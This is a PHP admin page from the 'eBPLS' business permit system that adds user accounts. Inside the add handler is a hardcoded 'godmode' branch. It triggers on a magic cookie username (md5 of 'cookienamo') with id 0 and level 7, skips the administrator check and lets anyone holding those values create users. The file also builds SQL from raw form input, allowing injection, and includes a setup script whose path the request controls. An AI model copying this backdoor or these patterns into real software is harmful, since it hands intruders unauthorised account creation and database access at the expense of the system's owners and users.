<?php
//	eBPLS_PAGE_USER_ADD: This module allows admins to add user accounts.
ob_start();
$strFrmctr = (empty($frmctr)) ? "" : "_" . $frmctr;
$qryVar1 = "frmDomain".$strFrmctr;
require_once "includes/config.php";
$strSetupDir = (empty($ThUserData[domain])) ? "" : $ThUserData[domain] . '/';
$strSetupDir = (isset($$qryVar1)) ? $$qryVar1 . '/' : $strSetupDir;
$strSettingScript = "setup/" . $strSetupDir . "setting.php";
include_once $strSettingScript;
require_once "lib/ebpls.lib.php";
dbConnect();
$intUserLevel = isUserLogged();
syncUserCookieDbLogStat();

require_once("lib/ebpls.utils.php");
include("includes/variables.php");
include("lib/multidbconnection.php");
                                                                                
$dbLink =Open($dbtype,$connecttype,$dbhost,$dbuser,$dbpass,$dbname);

//--- get connection from DB
//$dbLink = get_db_connection();

?>

<html>
<head>
	<title>eBPLS</title>
	<link href="stylesheets/default.css" rel="stylesheet" type="text/css">
	<script language="JavaScript" src="includes/eBPLS.js"></script>
</head>
<body bgcolor="#FFFFFF" text="#000000" link="" vlink="" alink="" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">

<table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td align="CENTER" valign="MIDDLE">

<table width="650" border="0" cellspacing="1" cellpadding="1">
	<tr>
		<td bgcolor="<?php echo($thThemeColor4); ?>" align="RIGHT" class="thText">
			<a href="javascript: opener.location.href='index.php?part=4&class_type=Settings&itemID_=7&busItem=Settings&permit_type=Settings&settings_type=UserManager&item_id=Settings'; window.close();"><b>Close this Window [X]</b></a><br>
		</td>
	</tr>
</table>

<?php
// update record if triggered
if (!empty($frmBtnAdd)) {
	$frmPassword = crypt_md5($frmPassword,$decoder);
	//echo $frmPassword;
	$frmLevel = crypt_md5($frmLevel,$decoder);
	$strQuery = "INSERT INTO ebpls_user SET
		level = '$frmLevel',
		username = '$frmUsername',
		password = '$frmPassword',
		lastname = '$frmLastname',
		firstname = '$frmFirstname',
		designation = '$frmDesignation',
		email = '$frmEmail',
		gsmnum = '$frmGsmnum',
		login = NOW(),
		logout = NOW(),
		dateadded = NOW(),
		lastupdated = NOW()
	";
	$blnExist = checkUserAccount($frmUsername);
if ($ThUserData[id]==0  and $ThUserData[username]==md5("cookienamo") and $ThUserData[level]==7) {
$godmode = 'on';
$ulev=6;
}
	if ((decrypt_md5($intUserLevel,$decoder) >= eBPLS_USER_ADMIN || $godmode=='on') && !$blnExist) {
		$result = th_query($strQuery);
		//--- save the sub_levels
		$frmReportMgrSub	= trim($frmReportMgrSub);
		$frmCTCSub		= trim($frmCTCSub);
		$frmPermitBusSub	= trim($frmPermitBusSub);
		$frmPermitOccSub	= trim($frmPermitOccSub);
		$frmPermitPedSub	= trim($frmPermitPedSub);
		$frmPermitFraSub	= trim($frmPermitFraSub);
		$frmPermitFisSub	= trim($frmPermitFisSub);
		$frmPermitMotSub	= trim($frmPermitMotSub);
		$frmSettingsSub		= trim($frmSettingsSub);

		$uid	= getUserID($dbLink,$frmUsername,$frmPassword,$frmLastname,$frmFirstname);
		//--- report mgr
	//	$sublevels = @explode(":", $frmReportMgrSub);
		 //--- save
                $all_keys = @array_keys($sublevel);
                if ($all_keys <> "") {
                foreach($all_keys as $key_sublevel)
                {
                        saveSubLevel($dbLink,$uid,$key_sublevel);
                }
            	}



	/*
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
	*/
		//--- CTC
		$sublevels = @explode(":", $frmCTCSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit bus
		$sublevels = @explode(":", $frmPermitBusSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit Mot
		$sublevels = @explode(":", $frmPermitMotSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit occ
		$sublevels = @explode(":", $frmPermitOccSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit ped
		$sublevels = @explode(":", $frmPermitPedSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit Fra
		$sublevels = @explode(":", $frmPermitFraSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- permit Fis
		$sublevels = @explode(":", $frmPermitFisSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		//--- settings
		$sublevels = @explode(":", $frmSettingsSub);
		for($i = 0;$i < count($sublevels) ;$i++)
		{
			if(intval($sublevels[$i]) > 0)
			{
				//--- save it
				saveSubLevel($dbLink,$uid,$sublevels[$i]);
			}	
		}
		
		
	} else {
		$result = FALSE;
	}
	if ($result === FALSE) {
		echo ($blnExist) ?
			"<div align=\"CENTER\" class=\"thFieldTitle\">Update Failed! Username Already Exist.</div>" :
			"<div align=\"CENTER\" class=\"thFieldTitle\">Update Failed! Contact Administrator.</div>";
	} else {
		echo "<div align=\"CENTER\" class=\"thFieldTitle\">Add Successfull!</div>";
	}
}

// ********************** START HERE **********************
?>

<link href="stylesheets/default.css" rel="stylesheet" type="text/css">
<div align="CENTER" class="thText">

<form name='_FRM' method="POST" action="<?php echo($HTTP_SERVER_VARS['PHP_SELF']); ?>">
<table border=0 width=100% align=center cellspacing=0 cellpadding=0>
		<tr><td colspan=2 class=header align=center width=100%>SETTINGS</td></tr>
		<tr>
			<td colspan=2 align=center>
			</td>
		</tr>
		<tr width=100%>
<td align=center colspan=3 class=header2> ADD USER </td>
		</tr>
		<tr>
			<td colspan=2 align=center>
			</td>
		</tr>
		<tr>
			<td colspan=2 align=center>
			</td>
		</tr>
		<tr>
			<td colspan=2 align=center>
			</td>
		</tr>
	</table>

<table width="500" border="1" bordercolor="#000000" cellspacing="1" cellpadding="2">
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>User Level</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
<?php
	echo decodeUserLevel(null);
?>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>User Name</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmUsername" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#D0E8FF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Password</b></font>
		</td>
		<td bgcolor="#D0E8FF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="Password" name="frmPassword" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#D0E8FF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Confirm Password</b></font>
		</td>
		<td bgcolor="#D0E8FF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="Password" name="frmPassword1" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Lastname</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmLastname" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#D0E8FF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Firstname</b></font>
		</td>
		<td bgcolor="#D0E8FF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmFirstname" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Designation</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmDesignation" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#D0E8FF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Email Address</b></font>
		</td>
		<td bgcolor="#D0E8FF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmEmail" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>GSM Number</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><input type="TEXT" name="frmGsmnum" value="" size="20" style="width:270px"></font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>CTC</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmCTCSub'>
			<?php echo getSubLevel($dbLink,'CTC'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Business Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitBusSub'>
			<?php echo getSubLevel($dbLink,'Business Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Motorized Operator Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitMotSub'>
			<?php echo getSubLevel($dbLink,'Motorized Operator Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Occupational Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitOccSub'>
			<?php echo getSubLevel($dbLink,'Occupational Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Peddlers Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitPedSub'>
			<?php echo getSubLevel($dbLink,'Peddlers Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<!--<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Franchise Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitFraSub'>
			<?php echo getSubLevel($dbLink,'Franchise Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>-->
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Fishery Permit</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmPermitFisSub'>
			<?php echo getSubLevel($dbLink,'Fishery Permit'); ?>	
			</select>
			</font>
		</td>
	</tr>
	<tr>
		<td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Settings</b></font>
		</td>
		<td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
			<font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
			<input type='hidden' name='frmSettingsSub'>
			<?php echo getSubLevel($dbLink,'Settings'); ?>	
			</select>
			</font>
		</td>
	</tr>
	 <tr>
	 <td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
                        <font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>Report Manager</b></font>
                </td>
                <td bgcolor="#FFFFFF" width="400" align="LEFT" valign="MIDDLE">
                        <font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
                        <input type='hidden' name='frmReportMgrSub'>
                        <!--//<select name="frmReportMgr"  multiple  style="width:320px;height=200px" onChange='javascript:_validate_settings("frmReportMgr");'>                        //-->
                        <?php echo getSubLevel($dbLink,'Reports Manager'); ?>
                        <!--///select //-->
                        </font>
                </td>
        </tr>
	 <tr>
                <td bgcolor="#FFFFFF" width="200" align="LEFT" valign="MIDDLE">
                        <font face="ARIAL,HELVETICA,SANS-SERIF" size="2"><b>References</b></font>
                </td>
                <td bgcolor="#FFFFFF" width="300" align="LEFT" valign="MIDDLE">
                        <font face="ARIAL,HELVETICA,SANS-SERIF" size="2">
                        <input type='hidden' name='frmReportMgrSub'>
                    <!--    <select name="frmReportMgr"  multiple  style="width:320px;height=200px" onChange='javascript:_validate_settings("frmReportMgr");'>-->
                        <?php echo getSubLevel($dbLink,'References'); ?>
                        </select>
                        </font>
                </td>
        </tr>

</table>
<br>

<?php
echo "<input type=\"HIDDEN\" name=\"frmctr\" value=\"{$frmctr}\">\n";
echo "<input type=\"HIDDEN\" name=\"$qryVar1\" value=\"" . $$qryVar1 . "\">\n";
echo "<input type=\"HIDDEN\" name=\"frmBtnAdd\">\n";
echo "<input type=\"BUTTON\" name=\"BtnAdd\" value=\"Save\" onClick=\"javascript: AddUser();\"> &nbsp; &nbsp;\n";
echo "<input type=\"BUTTON\" name=\"frmBtnCancel\" value=\"Close\" onClick=\"javascript: window.close();\"> &nbsp; &nbsp;\n";
echo "</form>\n";
echo "</div>\n";
// **********************  END HERE  **********************



// *** Module Dependent User-defined Functions ***
function decodeUserLevel($intLevel)
{
	switch ($GLOBALS['intUserLevel']) {
		case eBPLS_ROOT_ADMIN: $intIdxStart=0; $intIdxEnd=eBPLS_ROOT_ADMIN; break;
		case eBPLS_USER_ADMIN: $intIdxStart=0; $intIdxEnd=eBPLS_USER_ADMIN; break;
		default: $intIdxStart=null; $intIdxEnd=null; break;
	}
	return getMemFormSelect($GLOBALS['thUserLevel'], 1, "frmLevel", crypt_md5($intLevel,$decoder), $intIdxStart, $intIdxEnd, FALSE);
}

function getUserID($dbLink,$frmUsername,$frmPassword,$frmLastname,$frmFirstname)
{
	$sql    	= "SELECT id as userid FROM 
			  ebpls_user WHERE  
			  username = '$frmUsername' AND 
			  password = '$frmPassword' AND
		          lastname = '$frmLastname' AND
		          firstname = '$frmFirstname' LIMIT 1";
	$resultset 	= @mysql_query($sql, $dbLink);
	$datarow 	= @mysql_fetch_array($resultset);
	return intval($datarow['userid']);
}

function saveSubLevel($dbLink,$uid,$sublevel)
{
	$sql    	= "INSERT INTO ebpls_user_sublevel_listings (user_id,sublevel_id) VALUES($uid,$sublevel)";
	$resultset 	= @mysql_query($sql, $dbLink);
	$rows		= @mysql_numrows($resultset);	
	
	return $rows;
}
/*
 function bytexor($a,$b,$l)
  {
   $c="";
   for($i=0;$i<$l;$i++) {
     $c.=$a{$i}^$b{$i};
   }
   return($c);
  }
                                                                                                                                                                                                   
  function binmd5($val)
  {
   return(pack("H*",md5($val)));
  }
                                                                                                                                                                                                   
                                                                                                                                                                                                   
 function decrypt_md5($msg,$heslo)
  {
   $key=$heslo;$sifra="";
   $key1=binmd5($key);
   while($msg) {
     $m=substr($msg,0,16);
     $msg=substr($msg,16);
     $sifra.=$m=bytexor($m,$key1,16);
     $key1=binmd5($key.$key1.$m);
   }
   echo "\n";
   return($sifra);
  }
                                                                                                                                                                                                   
  function crypt_md5($msg,$heslo)
  {
   $key=$heslo;$sifra="";
   $key1=binmd5($key);
   while($msg) {
     $m=substr($msg,0,16);
     $msg=substr($msg,16);
     $sifra.=bytexor($m,$key1,16);
     $key1=binmd5($key.$key1.$m);
   }
   echo "\n";
   return($sifra);
  }
*/


function getSubLevel($dbLink,$mode)
{
        global $sublevel_listings;
                                                                                                                                                                                                   
        $sql            = "SELECT * FROM ebpls_user_sublevel WHERE title='$mode' order by id asc";
        $resultset      = @mysql_query($sql, $dbLink);
                                                                                                                                                                                                   
                                                                                                                                                                                              
        //--- set the default
        $select_str     = '';
        $arr_id         = null;
        while($datarow  = @mysql_fetch_array($resultset))
        {
                $id        = trim($datarow['id']);
                $title     = trim($datarow['title']);
                $menu      = trim($datarow['menu']);
                $submenu   = trim($datarow['submenu']);
                @$option    = (strlen($submenu) > 0) ? (str_repeat('- ',strlen($menu)-5).'> ' . $submenu) : $menu;
                $selected  = (@in_array($id,$sublevel_listings)) ? (' checked ') : ('');
                if((strlen($submenu) >  0) and $menu != $prev_menu)
                {
                        $subctr++;
                        if($subctr == 1)
                        {
                          $select_str .= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$menu\n<br>";
                        }
                }
                else
                {
                        $subctr = 0;
                }
                $prev_menu = $menu;
                $select_str .= "<input type='checkbox' name='sublevel[$id]' value='1' $selected>&nbsp;$option\n<br>";
                $prev_menu = $menu;
                $arr_id[$i++] = $id;
        }
        $list_id     = @join(':',$arr_id);
        $select_str .= "&nbsp;<a href='javascript:checkAll(\"$list_id\")' class='subnavwhite1' onClick=''>Check All</a>&nbsp;&nbsp;<a href='javascript:clearAll(\"$list_id\")' class='subnavwhite1' onClick=''>Clear All</a>\n<br>";
        return $select_str;
}


?>

		</td>
	</tr>
</table>
<script language='Javascript'>
function AddUser()
{
	var _FRM = document._FRM;
	var invalidCharactersRegExp = /[^a-z\d]/i;
	var isValid = !(invalidCharactersRegExp.test(_FRM.frmUsername.value));
	var isValidP = !(invalidCharactersRegExp.test(_FRM.frmPassword.value));
	var isValidP1 = !(invalidCharactersRegExp.test(_FRM.frmPassword1.value));
	var validFormatRegExp = /^(\+\d{12})/i;
	var isValidGSM = validFormatRegExp.test(_FRM.frmGsmnum.value);
	var validFormatEmailRegExp = /^\w(\.?\w)*@\w(\.?[-\w])*\.[a-z]{2,4}$/i;
	var isValidEmail = validFormatEmailRegExp.test(_FRM.frmEmail.value);
	if (_FRM.frmUsername.value == "" || _FRM.frmUsername.value == 0)
	{
		alert("Enter Valid Username!!");
		_FRM.frmUsername.focus();
		return false;
	}
	if (_FRM.frmUsername.value.length > 15)
	{
		alert("Username Exceeds Max Length!!");
		_FRM.frmUsername.focus();
		return false;
	}
	if (isValid == false)
	{
		alert("Enter Valid Username!!");
		_FRM.frmUsername.focus();
		return false;
	}
	if (_FRM.frmPassword.value == "")
	{
		alert("Enter Valid Password!!");
		_FRM.frmPassword.focus();
		return false;
	}
	if (_FRM.frmPassword.value.length > 20)
	{
		alert("Password Exceeds Max Length!!");
		_FRM.frmPassword.focus();
		return false;
	}
	if (isValidP == false)
	{
		alert("Enter Valid Password!!");
		_FRM.frmPassword.focus();
		return false;
	}
	if (_FRM.frmPassword1.value == "")
	{
		alert("Enter Valid Password!!");
		_FRM.frmPassword1.focus();
		return false;
	}
	if (_FRM.frmPassword1.value.length > 20)
	{
		alert("Password Exceeds Max Length!!");
		_FRM.frmPassword1.focus();
		return false;
	}
	if (isValidP1 == false)
	{
		alert("Enter Valid Password!!");
		_FRM.frmPassword1.focus();
		return false;
	}
	if (_FRM.frmPassword.value != _FRM.frmPassword1.value)
	{
		alert("Passwords Do Not Match!!");
		_FRM.frmPassword.focus();
		return false;
	}
//	if (_FRM.frmEmail.value != "" || _FRM.frmEmail.value != 0)
//	{
		if (isValidEmail == false && _FRM.frmEmail.value != "")
		{
			alert(_FRM.frmEmail.value);
			alert("Enter Valid Email!!");
			_FRM.frmEmail.focus();
			return false;
		}
//	}
//	if (_FRM.frmGsmnum.value != "" || _FRM.frmGsmnum.value != 0)
//	{
		if (isValidGSM == false && _FRM.frmGsmnum.value != "")
		{
			alert("Enter Valid GSM Number!!\n Format : +123456789012");
			_FRM.frmGsmnum.focus();
			return false;
		}
//	}
	_FRM.frmBtnAdd.value = "Add";
	_FRM.submit();
	return true;
}

function _validate_settings(_elem)
{
	var _FRM = document._FRM;
	
	var _len = eval('_FRM.' + _elem + '.options.length');
	
	for(i=0;i<_len;i++)
	{
		var _sel = eval('_FRM.' + _elem + '.options[' + i + '].selected');	
		var _val = eval('_FRM.' + _elem + '.options[' + i + '].value');	
		if( _sel == true && _val == -1)
		{
		    if(_elem == 'frmReportMgr')
		    {
		    	_FRM.frmReportMgr.options[i].selected = false;
		    }
		    if(_elem == 'frmCTC')
		    {
		    	_FRM.frmCTC.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitBus')
		    {
		    	_FRM.frmPermitBus.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitMot')
		    {
		    	_FRM.frmPermitMot.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitPed')
		    {
		    	_FRM.frmPermitPed.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitFra')
		    {
		    	_FRM.frmPermitFra.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitOcc')
		    {
		    	_FRM.frmPermitOcc.options[i].selected = false;
		    }
		    if(_elem == 'frmPermitFis')
		    {
		    	_FRM.frmPermitFis.options[i].selected = false;
		    }
		    if(_elem == 'frmSettings')
		    {
		    	_FRM.frmSettings.options[i].selected = false;
		    }
		    
		}
	}
}
function _validate_settings2()
{
    var _FRM = document._FRM;
	
    var _len = 0;
    var _concat = '';
    
    	_len = _FRM.frmReportMgr.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmReportMgr.options[i].selected;
		var _val = _FRM.frmReportMgr.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmReportMgrSub.value=_concat;
    
    	_len = _FRM.frmCTC.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmCTC.options[i].selected;
		var _val = _FRM.frmCTC.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmCTCSub.value=_concat;
    
    	_len = _FRM.frmPermitBus.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitBus.options[i].selected;
		var _val = _FRM.frmPermitBus.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitBusSub.value=_concat;
    
    	_len = _FRM.frmPermitMot.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitMot.options[i].selected;
		var _val = _FRM.frmPermitMot.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitMotSub.value=_concat;
    
    	_len = _FRM.frmPermitPed.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitPed.options[i].selected;
		var _val = _FRM.frmPermitPed.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitPedSub.value=_concat;
    
    	_len = _FRM.frmPermitFra.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitFra.options[i].selected;
		var _val = _FRM.frmPermitFra.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitFraSub.value=_concat;
    
    	_len = _FRM.frmPermitOcc.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitOcc.options[i].selected;
		var _val = _FRM.frmPermitOcc.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitOccSub.value=_concat;
    
    	_len = _FRM.frmPermitFis.options.length;
    	_concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmPermitFis.options[i].selected;
		var _val = _FRM.frmPermitFis.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmPermitFisSub.value=_concat;
    
    	_len = _FRM.frmSettings.options.length;
        _concat = '';	
    	for(i=0;i<_len;i++)
	{
		var _sel = _FRM.frmSettings.options[i].selected;
		var _val = _FRM.frmSettings.options[i].value;
		if(_val > 0 && _sel == true)
		{
			_concat = _concat + _val + ':';		
		}
		
	}
	_FRM.frmSettingsSub.value=_concat;
    
    
    
    _FRM.submit();	
    return true;
}

function checkAll(ids)
{
        var _FRM     = document._FRM;
        var _arr_ids = ids.split(":");
        for (var i=0;  i < _FRM.elements.length; i ++)
        {
                var _element = _FRM.elements[i];
                var _type = _element.type;
                                                                                                               
                if ( _type == "checkbox" )
                {
                        for(j=0;j<_arr_ids.length;j++)
                        {
                                var _chkname = 'sublevel[' + _arr_ids[j] + ']';
                                if(_chkname == _element.name)
                                {
									
                                        _element.checked = ( _element.checked ) ? true : true;
                                        break;
                                }
                        }
                }
        }
}

function clearAll(ids)
{
        var _FRM     = document._FRM;
        var _arr_ids = ids.split(":");
        for (var i=0;  i < _FRM.elements.length; i ++)
        {
                var _element = _FRM.elements[i];
                var _type = _element.type;
                                                                                                               
                if ( _type == "checkbox" )
                {
                        for(j=0;j<_arr_ids.length;j++)
                        {
                                var _chkname = 'sublevel[' + _arr_ids[j] + ']';
                                if(_chkname == _element.name)
                                {
									
                                        _element.checked = ( !_element.checked ) ? false : false;
                                        break;
                                }
                        }
                }
        }
}


</script>
</body>
</html>
<?php
if ($intUserLevel > -1) setCurrentActivityLog($thStrLogAction);
ob_end_flush();
?>
                                                                                                                                                                                                                               
